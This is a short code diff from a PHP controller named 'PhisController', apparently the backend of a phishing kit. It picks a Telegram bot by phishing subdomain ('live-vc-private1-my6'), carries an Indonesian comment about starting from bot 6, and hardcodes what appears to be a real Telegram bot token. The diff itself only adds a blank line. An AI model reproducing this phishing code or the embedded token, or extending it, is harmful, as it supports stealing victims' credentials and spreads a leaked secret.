@@ -43,6 +43,7 @@ class PhisController extends Controller
     {
         // mulai dari bot 6 yah
 
+
         if ($subdomain == "live-vc-private1-my6") {
             // BOT 6
             $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
